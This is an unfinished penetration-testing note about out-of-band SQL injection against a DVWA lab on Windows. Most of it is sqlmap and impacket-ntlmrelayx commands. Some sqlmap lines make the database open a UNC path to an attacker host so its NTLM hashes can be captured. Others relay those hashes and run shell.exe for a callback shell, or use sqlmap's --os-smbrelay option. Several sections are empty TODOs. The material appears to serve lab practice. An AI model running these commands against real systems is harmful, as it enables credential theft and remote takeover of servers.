---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - initial-access
  - post-exploitation
  - server-side-attack
  - sqlmap
  - dvwa
---
# 03 - Out-of-Band

> [!IMPORTANT] Conditions
> The DB user must have **FILE** and **SELECT** privileges with the flags `--privileges -U CU`.

## 3.1 - Windows

TODO: Fill in this info to test a windows environment

TODO: Test this and place it where it's appropriate

### 3.1.1 - Grab NTLM Hashes via SMB Authentication Relay

- Run [[02 - DBMS Backend Relay Attack|Responder]] to grab the NTLM hashes. This also can be done with [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Authentication Relay/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]] including [[02 - NTLM Relaying|ntlmrelayx]].

- Responder

```

```

- Metasploit Framework

```
smb_relay
```

- Impacket ntlmrelayx

```
$ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support
```

- Exploit the webserver via SQL injection manually using either `--file-read` or `--sql-query`.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="\\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --sql-query="SELECT LOAD_FILE('\\\\<attacker_IP>\\snare.txt')"
```

### 3.1.2 - Authenticated SMB Relay Callback Shell

#### 3.1.2.1 - Automated

- Exploit the webserver via SQL injection with `--os-smbrelay` but run with root privileges.

```
$ sudo sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --os-smbrelay
```

#### 3.1.2.2 - Manual

Repeat the [[01 - Webshell|previous step]] and launch [[02 - NTLM Relaying|ntlmrelayx]] and/or [[02 - Responder|Responder]] to receive a callback shell connection. This can be done with [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Authentication Relay/Metasploit#^c109ec|metasploit SMB relay exploit module]].

```
$ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
```